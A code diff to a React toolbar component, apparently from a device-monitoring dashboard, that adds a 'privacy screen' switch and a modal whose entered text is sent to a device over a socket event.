@@ -1,9 +1,12 @@
 import React, { useState } from "react";
 import { useTranslation } from "react-i18next";
-import { Box, Switch, FormControlLabel } from "@mui/material";
+import { Box, Switch, FormControlLabel, Modal, Typography, TextField, Button } from "@mui/material";
 
 import { useSocketFunctions } from "../../utils/socket";
 import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
+
+import CloseOutlinedIcon from "@mui/icons-material/CloseOutlined";
+import CheckCircleOutlineOutlinedIcon from "@mui/icons-material/CheckCircleOutlineOutlined";
 
 import Color from "src/theme/colors";
 
@@ -12,7 +15,10 @@ const ScreenToolbar = ({ visible, device }) => {
   const { onScreenSettingEvent } = useSocketFunctions();
   const [blackStatus, setBlackStatus] = useState(false);
   const [lockStatus, setLockStatus] = useState(false);
+  const [privacyScreen, setPrivacyScreen] = useState(false);
+  const [privacyText, setPrivacyText] = useState("");
 
+  // Black Screen Option
   const onSwitchBlackScreen = async (event) => {
     const newStatus = event.target.checked;
     setBlackStatus(newStatus);
@@ -24,6 +30,7 @@ const ScreenToolbar = ({ visible, device }) => {
     });
   };
 
+  // Lock Screen Option
   const onSwitchLockScreen = async (event) => {
     const newStatus = event.target.checked;
     setLockStatus(newStatus);
@@ -35,6 +42,23 @@ const ScreenToolbar = ({ visible, device }) => {
     });
   };
 
+  // Privacy Screen Option
+  const onSwitchPrivacyScreen = async (event) => {
+    const newStatus = event.target.checked;
+    setPrivacyScreen(newStatus);
+  };
+
+  // Handle the Privacy Screen OK button click
+  const onPrivacyScreen = async () => {
+    await onScreenSettingEvent(SocketIOPublicEvents.screen_setting_event, {
+      type: "privacyScreen",
+      deviceId: device?.deviceId,
+      text: privacyText,
+    });
+
+    setPrivacyScreen(false);
+  };
+
   return (
     <Box
       className={`toolbar ${visible ? "visible" : "hidden"}`}
@@ -43,13 +67,12 @@ const ScreenToolbar = ({ visible, device }) => {
         left: "10px",
         top: "30px",
         width: "100%",
-        height: 100,
         background: Color.background.secondary,
         zIndex: 999,
         display: "flex",
         justifyContent: "space-between",
-        alignItems: "center",
-        padding: "0 20px",
+        alignItems: "flex-start",
+        padding: "10px 20px",
       }}
     >
       {/* Toolbar content */}
@@ -88,7 +111,78 @@ const ScreenToolbar = ({ visible, device }) => {
             label={t("devicesPage.monitors.lock-setting")}
           />
         </li>
+        <li>
+          <FormControlLabel
+            className="back-option"
+            sx={{
+              color: "white",
+              fontSize: "12px",
+              alignItems: "center",
+              justifyContent: "start",
+              display: "flex",
+              flexDirection: "row-reverse",
+            }}
+            labelPlacement="start"
+            control={
+              <Switch color="primary" checked={privacyScreen} onChange={onSwitchPrivacyScreen} />
+            }
+            label={t("devicesPage.monitors.privacy-screen")}
+          />
+        </li>
       </ul>
+
+      {/* Modal for editing */}
+      <Modal open={privacyScreen} onClose={() => setPrivacyScreen(false)}>
+        <Box
+          sx={{
+            position: "absolute",
+            top: "50%",
+            left: "50%",
+            transform: "translate(-50%, -50%)",
+            width: 400,
+            border: `solid 1px ${Color.background.border}`,
+            backgroundColor: Color.background.main,
+            borderRadius: "5px",
+            p: 2,
+            zIndex: 99999,
+          }}
+        >
+          <Box
+            sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}
+          >
+            <Typography component="h2" sx={{ color: Color.text.primary }}>
+              {t("devicesPage.monitors.privacy-screen-title")}
+            </Typography>
+            <CloseOutlinedIcon
+              onClick={() => setPrivacyScreen(false)}
+              sx={{
+                color: Color.text.primary,
+                cursor: "pointer",
+                fontSize: "20px",
+              }}
+            />
+          </Box>
+          <Box sx={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "10px" }}>
+            <TextField
+              fullWidth
+              label={t("devicesPage.monitors.skeleton-input")}
+              value={privacyText}
+              onChange={(e) => setPrivacyText(e.target.value)} // Update the state with the inputted text
+            />
+            <Button
+              variant="contained"
+              sx={{
+                width: "100px",
+                gap: "10px",
+              }}
+              onClick={onPrivacyScreen} // Call the onPrivacyScreen function when OK is clicked
+            >
+              <CheckCircleOutlineOutlinedIcon />
+              OK
+            </Button>
+          </Box>
+        </Box>
+      </Modal>
     </Box>
   );
 };
